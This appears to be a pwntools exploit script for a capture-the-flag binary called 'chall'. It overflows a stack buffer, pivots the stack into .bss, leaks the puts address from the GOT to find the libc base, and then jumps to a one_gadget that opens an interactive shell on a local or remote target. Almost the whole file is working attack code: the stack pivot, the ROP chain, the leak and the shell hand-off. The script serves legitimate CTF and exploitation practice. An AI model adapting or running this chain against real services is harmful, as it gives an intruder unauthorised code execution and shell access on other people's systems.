#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./chall")

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

ELF.set_interpreter(binary.path, ld.path)
ELF.patch_custom_libraries(binary.path, libc.path.removesuffix("/libc.so.6"), False)

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
def finder(gadget):
    gadget = [gadget.strip() for gadget in gadget.split(";")]
    return ROP(binary).find_gadget(gadget).address

BUFFER_SIZE = 0x20
STACK_GROWTH_SIZE = 0x200 # Arbitrary number, just so function calls won't corrupt anything important

g = cyclic_gen()
def trash(size):
    return g.get(size)

# Pivot into .bss
payload = flat([
    trash(0x20),
    binary.sym["stderr"] + BUFFER_SIZE,
    binary.sym["main"] + 0xc,
    ])
if b"\n" in payload:
    log.warning(f"Newline inside payload: {payload}")
io.sendline(payload)
io.recvline()

# Overwrite stderr to manipulate rdi
payload = flat([
    binary.got["puts"],
    trash(0x18),
    binary.sym["stderr"] + STACK_GROWTH_SIZE,
    finder("leave; ret"),
    trash(0x1d0),
    binary.sym["stderr"] + STACK_GROWTH_SIZE*2,
    binary.sym["puts"],
    binary.sym["main"] + 0xc,
    ])
if b"\n" in payload:
    log.warning(f"Newline inside payload: {payload}")
io.sendline(payload)
io.recvline()

puts_addr = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
log.info(f"Puts addr: {hex(puts_addr)}")
libc_base = puts_addr - 0x87be0
log.info(f"Libc base: {hex(libc_base)}")

# Requirements: rax=0, [rbp-0x50] writable, [rbp-0x78]=NULL
one_gadget = libc_base + 0xef52b
log.info(f"One gadget: {hex(one_gadget)}")
assert libc_base & 0xFFF == 0

# Call one_gadget
payload = flat([
    trash(0x20),
    binary.sym["stderr"] + STACK_GROWTH_SIZE*3,
    one_gadget,
    b"\x00" * 0x1d0,
    ])
if b"\n" in payload:
    log.warning(f"Newline inside payload: {payload}")
io.sendline(payload)
io.recvline()

io.interactive()
